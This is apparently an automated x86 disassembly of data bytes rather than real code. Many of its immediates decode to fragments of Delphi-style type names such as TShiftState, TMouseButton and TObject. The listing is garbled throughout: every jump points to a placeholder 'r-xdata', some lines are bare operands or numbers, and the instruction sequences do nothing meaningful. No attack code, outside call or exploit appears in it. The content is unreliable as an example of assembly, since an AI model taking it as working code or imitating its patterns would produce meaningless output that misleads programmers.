add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
add al 0x7f
imul ebp [ edi + 0x6e ] 0x7ef0c08b
inc esp
add [ eax ] cl
insd
dec ebp
popad
outsb
je r-xdata
push ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc esp
outsd
insb
jae r-xdata
popad
jb r-xdata
outsb
mov eax eax
or [ ebx + 0x6f ] al
outsb
je r-xdata
dec esp
popad
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add al dh
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
js r-xdata
add [ eax ] cl
add [ eax ] al
push [ eax ]
mov esi 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
add [ eax + 0x7f ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
add al 0x5
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x447f0801
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push esi
inc ecx
add [ eax + r-xdata ] dl
push 0xf0004010
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
jle r-xdata
inc eax
add [ esi + edi * 2 + 0x9030044 ] dl
push esp
inc esp
jb r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
dec ebx
imul ebp [ esi + 0x64 ] 0x1
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + edi * 2 + 0x44 ] al
add [ eax ] al
adc [ eax ] al
nop
mov al [ 0x8004482 ]
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add al dh
push esi
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x7e6fffc0 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add al 0x11
inc eax
add ah ah
js r-xdata
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
pop es
jb r-xdata
add [ eax - 0x7d ] cl
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
in al 0x78
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
sbb [ edx + 0xe080044 ] al
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x7de7ffc0 ] cl
inc esp
add [ eax ] cl
push cs
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ ecx + 0x7 ] ebx
add al 0x11
inc eax
add [ ebx + edi * 2 + 0x103c0044 ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x7bf3ffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + eax * 4 + 0xe080044 ] ah
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add al cl
jge r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x7cffffc0 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
je r-xdata
push ebx
add al dh
push esi
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ ebx + edi * 2 + 0x103c0044 ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + edi * 2 + 0x44 ] al
add [ eax ] al
adc [ eax ] al
nop
pushfd
test [ eax + eax + 0x8 ] al
or al 0x54
add al 0x11
outsb
je r-xdata
jbe r-xdata
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
hlt
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc ebx
jpe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
test [ ebx + 0x44 ] bh
add [ ebp + eax * 4 + 0x44 ] dl
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add ah dh
mov al [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
loopne r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add ah dh
mov al [ eax + eax - 0x34 ]
xchg edx eax
inc esp
add [ eax ] al
adc [ eax ] al
or [ ebp + 0xf080044 ] al
push esp
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x448768c0 ] cl
add [ eax ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4486e0c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
push edi
push 0x556c6565
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
push 0x8004487
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
mov [ eax + eax - 0x16 ] eax
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc ecx
add [ eax ] al
xor al 0x6b
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
push eax
xchg [ eax + eax + 0x8 ] al
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
mov al [ 0x280044e5 ]
xor [ eax ] eax
inc esp
xor [ eax ] eax
retn
jo r-xdata
add [ ebx + ebp * 2 ] dh
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add al dh
push esi
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
lea eax [ eax ]
or [ eax + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 ] cl
inc esp
add al bh
mov al [ eax + eax ]
jbe r-xdata
mov al [ eax + eax + 0x5c ]
add [ eax ] eax
add dl ch
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add al dh
push esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
fadd [ edi + 0x12080044 ]
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ebx + eax * 8 + 0x44 ] ah
add [ eax + 0x780044f2 ] al
out 0x44 al
add [ edx + ecx * 4 - 0xdb7ffbf ] al
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add al cl
lds eax [ eax + eax + 0x74 ]
iretd
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_44889a
inc esp
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ edx + eax * 8 - 0x1eefffbc ] cl
inc esp
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0xe0044 ] dh
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x1540040 ] dl
add [ eax ] al
dec ebx
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add al dl
les eax [ eax + eax + 0x14 ]
int3
sub_4488d6
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_448a2c
inc esp
add [ esi + ebp * 8 ] dl
inc esp
add [ ebp + ebp * 8 - 0x1247ffbc ] dl
inc esp
add [ esi * 8 - 0xf9fffbc ] al
inc esp
add [ esp + esi * 8 + 0x44 ] cl
add [ eax + ebx * 8 ] bl
inc esp
add [ eax - 0x37ffbb33 ] ch
out 0x44 al
add [ eax ] bh
loop r-xdata
add [ eax - 0xd ] ch
inc esp
add [ eax ] ah
les eax [ eax + eax - 0x34 ]
call 0xffffffffe7988aec
inc esp
add [ edx + ebp * 8 ] cl
inc esp
add [ edx + ebp * 8 - 0x2643ffbc ] dh
inc esp
add [ eax - 0x3c ] bl
inc esp
add [ eax - 0x57ffbb3b ] bl
lds eax [ eax + eax + 0x30 ]
les eax [ eax + eax + 0x7c ]
aam 0x44
add [ eax ] cl
in al 0x44
add [ eax + 0x440044c9 ] dl
fld [ eax + eax - 0x34 ]
xlat
inc esp
add [ esp + eax * 8 ] ch
inc esp
add [ esp + eax * 8 ] ah
inc esp
add [ eax - 0x2a ] dh
inc esp
add al ch
xlat
inc esp
add [ eax ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ edi ] dh
inc esp
add [ eax - 0x24 ] cl
inc esp
add [ edx + ebx * 8 - 0x9d3ffbc ] cl
inc esp
add [ eax - 0x63ffbb26 ] ah
0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
insb
nop
clc
mov al [ eax + eax + 0x7 ]
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
je r-xdata
outsd
insb
or [ eax + 0x6c300044 ] 0x41
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
[ ecx + ecx * 8 + 0x44 ]
cmp al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x4477f474
add [ eax ] bh
add bh bh
cwde
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 4 + 0x240044 ] cl
jns r-xdata
push esp
0x44
jae r-xdata
cld
enter 0x44 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040002 ] al
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add bh bh
add [ eax + ebx * 4 - 0x3fafffbb ] dh
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
in al dx
jl r-xdata
add [ eax + eax ] ah
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
dec [ eax ]

add bh bh
hlt
jb r-xdata
dec esp
add [ eax ] al
push r-xdata
adc [ eax ] al
inc esp
add [ eax ] al
jmp [ eax ]
add [ esp + edx * 2 ] ecx
inc edx
outsd
jb r-xdata
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
inc esp
add ah bl
cwde
inc ebp
add [ edi + esi * 8 - 0x3e37ffbc ] ah
inc esp
add [ eax + eax * 8 - 0x66d3ffbc ] al
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x70 ] 0x99
inc ebp
add [ eax ] bh
rol [ eax + eax + 0x78 ] 0x99
inc ebp
add [ edi + esi * 8 - 0x3dd3ffbc ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54150044
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x8d28c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ ecx * 4 + 0x69090044 ] ah
insd
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
cwde
inc ebp
add [ eax - 0x40 ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ eax - 0x1bffbb09 ] al
cmovb eax [ eax ]
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
dec eax
leave
inc esp
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x37010000 ]
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
mov es [ eax + eax + 0x3 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax ] ch
mov es [ eax + eax + 0x6 ]
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
lea eax [ eax + eax + 0x6 ]
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x62060044 ] al
imul ecx [ esi + 0x6f ] 0x6e
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov es [ eax + eax + 0x6 ]
nop
outsd
insb
jae r-xdata
mov eax eax
int3
outsb
je r-xdata
inc ebx
outsd
mov es [ eax + eax - 0x75 ]
ror [ eax + 0x300448e ] 0xa
push esp
inc edx
jbe r-xdata
sub [ esi - 0x3f74ffbc ] cl
mov [ esi + 0xa030044 ] cl
add [ eax ] ebp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
ror ah 0x8e
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
sar [ eax + 0xa00448d ] 0x8
add al [ eax ]
add [ eax + ecx * 4 ] dh
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
